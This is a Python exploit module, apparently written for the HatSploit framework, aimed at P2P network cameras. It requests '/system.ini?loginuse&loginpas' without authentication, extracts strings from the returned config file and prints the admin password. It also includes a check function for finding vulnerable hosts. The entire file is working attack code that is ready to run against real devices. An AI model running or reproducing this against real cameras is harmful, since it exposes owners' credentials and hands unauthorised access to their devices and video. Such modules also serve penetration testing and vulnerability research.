"""
This module requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.module import Module
from pex.proto.http import HTTPClient
from pex.string import String


class HatSploitModule(Module, HTTPClient, String):
    def __init__(self):
        super().__init__()

        self.details = {
            'Category': "exploit",
            'Name': "P2P Camera Password Disclosure",
            'Module': "exploit/linux/generic/p2p_password_disclosure",
            'Authors': [
                'Ivan Nikolsky (enty8080) - module developer',
                'Pierre Kim (pierrekim) - vulnerability researcher',
            ],
            'Description': "P2P network camera password disclosure.",
            'Platform': "linux",
            'Rank': "high",
        }

        self.options = {
            'HOST': {
                'Description': "Remote host.",
                'Value': None,
                'Type': "ip",
                'Required': True,
            },
            'PORT': {
                'Description': "Remote port.",
                'Value': 81,
                'Type': "port",
                'Required': True,
            },
            'USERNAME': {
                'Description': "Default username.",
                'Value': "admin",
                'Type': None,
                'Required': True,
            },
        }

    def exploit(self, remote_host, remote_port, username):
        response = self.http_request(
            method="GET",
            host=remote_host,
            port=remote_port,
            path='/system.ini?loginuse&loginpas',
        )

        gathered_data = response.text
        strings = self.extract_strings(gathered_data)

        if username in strings:
            username_index = strings.index(username)
            password = strings[username_index + 1]

            self.print_table(
                "Credentials", ('Username', 'Password'), (username, password)
            )
        else:
            self.print_warning(
                f"Target vulnerable, but default username is not {username}."
            )

    def check(self):
        remote_host, remote_port, _ = self.parse_options(self.options)

        response = self.http_request(
            method="GET",
            host=remote_host,
            port=remote_port,
            path='/system.ini?loginuse&loginpas',
        )

        return bool(response and response.status_code == 200)

    def run(self):
        remote_host, remote_port, username = self.parse_options(self.options)

        self.exploit(remote_host, remote_port, username)
